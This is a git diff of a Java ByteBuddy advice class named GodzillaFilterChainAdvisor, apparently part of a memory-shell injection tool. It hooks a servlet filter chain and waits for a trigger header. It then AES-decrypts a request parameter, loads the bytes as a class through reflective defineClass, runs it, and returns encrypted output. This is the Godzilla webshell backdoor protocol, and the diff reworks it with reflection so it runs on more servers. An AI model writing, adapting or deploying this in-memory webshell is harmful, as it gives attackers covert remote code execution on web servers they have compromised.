@@ -4,38 +4,30 @@ import net.bytebuddy.asm.Advice;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
-import javax.servlet.http.HttpSession;
 import java.io.ByteArrayOutputStream;
+import java.io.PrintWriter;
 import java.lang.reflect.Method;
 
 /**
  * @author ReaJason
  */
 public class GodzillaFilterChainAdvisor {
-    public static String key;
-    public static String pass;
-    public static String md5;
-    public static String headerName;
-    public static String headerValue;
 
     @Advice.OnMethodEnter(skipOn = Advice.OnNonDefaultValue.class)
     public static boolean enter(
-            @Advice.Argument(value = 0) ServletRequest req,
-            @Advice.Argument(value = 1) ServletResponse res
+            @Advice.Argument(value = 0) Object request,
+            @Advice.Argument(value = 1) Object response
     ) {
-        if (!(req instanceof HttpServletRequest)) {
-            return false;
-        }
-        HttpServletRequest request = (HttpServletRequest) req;
-        HttpServletResponse response = (HttpServletResponse) res;
+        String key = "key";
+        String pass = "pass";
+        String md5 = "md5";
+        String headerName = "headerName";
+        String headerValue = "headerValue";
         try {
-            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
-                HttpSession session = request.getSession();
-                String parameter = request.getParameter(pass);
+            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
+            if (value != null
+                    && value.contains(headerValue)) {
+                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                 byte[] data = null;
                 Class<?> base64;
                 try {
@@ -51,34 +43,37 @@ public class GodzillaFilterChainAdvisor {
                 SecretKeySpec keySpec = new SecretKeySpec(key.getBytes(), "AES");
                 c.init(2, keySpec);
                 data = c.doFinal(data);
-                if (session.getAttribute("payload") == null) {
+                Object session = request.getClass().getMethod("getSession").invoke(request);
+                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
+                if (sessionPayload == null) {
                     Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                     defineClass.setAccessible(true);
                     Class<?> payload = (Class<?>) defineClass.invoke(Thread.currentThread().getContextClassLoader(), data, 0, data.length);
-                    session.setAttribute("payload", payload);
+                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", payload);
                 } else {
-                    request.setAttribute("parameters", data);
+                    request.getClass().getMethod("setAttribute", String.class, Object.class).invoke(request, "parameters", data);
                     ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
-                    Object f = ((Class<?>) session.getAttribute("payload")).newInstance();
+                    Object f = ((Class<?>) sessionPayload).newInstance();
                     f.equals(arrOut);
                     f.equals(request);
-                    response.getWriter().write(md5.substring(0, 16));
+                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
+                    writer.write(md5.substring(0, 16));
                     f.toString();
 
                     c.init(1, keySpec);
                     byte[] encryptBytes = c.doFinal(arrOut.toByteArray());
-                    String value = null;
+                    String result = null;
                     try {
                         base64 = Class.forName("java.util.Base64");
                         Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
-                        value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, encryptBytes);
+                        result = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, encryptBytes);
                     } catch (Exception var6) {
                         base64 = Class.forName("sun.misc.BASE64Encoder");
                         Object encoder = base64.newInstance();
-                        value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, encryptBytes);
+                        result = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, encryptBytes);
                     }
-                    response.getWriter().write(value);
-                    response.getWriter().write(md5.substring(16));
+                    writer.write(result);
+                    writer.write(md5.substring(16));
                 }
                 return true;
             }
